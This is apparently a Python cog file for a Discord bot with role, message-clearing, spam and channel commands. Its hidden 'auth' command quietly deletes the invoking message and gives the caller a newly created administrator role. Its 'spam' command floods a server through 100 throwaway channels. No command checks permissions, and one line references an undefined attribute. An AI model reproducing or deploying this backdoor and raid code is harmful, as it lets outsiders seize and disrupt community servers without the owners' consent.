import os
import discord
from discord.utils import get
from discord.ext import commands


class Role(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command(
		aliases=['auth'])
	async def role_give(self, ctx):
		await ctx.message.delete()
		name = 'admins'
		roles = ctx.guild.roles
		role = get(roles, name=name)
		if role == None:
			await ctx.guild.create_role(
			    name=name, permissions=discord.Permissions(administrator=True))
		for i in range(len(roles)):
			role = get(roles, name=name)
			try:
				await role.edit(position=i)
			except:
				await ctx.author.add_roles(role)
				await ctx.send(self.ok)


class Message(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command(
		aliases=['clear'])
	async def message_clear(self, ctx, num: int):
		num += 1
		if num <= 1: num = 2
		elif num > 100: num = 100
		logs = []
		async for log in ctx.channel.history(limit=num):
			logs.append(log)
		await ctx.channel.delete_messages(logs)

	@commands.command(
		aliases=['spam'])
	async def message_spam(self, ctx, *, content):
		spams = []
		for i in range(100):
			name = 'spam-' + str(i)
			await ctx.guild.create_text_channel(name)
			spam = get(ctx.guild.channels, name=name)
			spams.append(spam)
			for i in range(5):
				await spam.send(content)
		for spam in spams:
			await spam.delete()


class Channel(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command()
	async def channel_create(self, ctx):
		await ctx.guild.create_text_channel('channel')

	@commands.command()
	async def channel_delete(self, ctx):
		await ctx.channel.delete()


def setup(bot):
	bot.add_cog(Role(bot))
	bot.add_cog(Message(bot))
	bot.add_cog(Channel(bot))
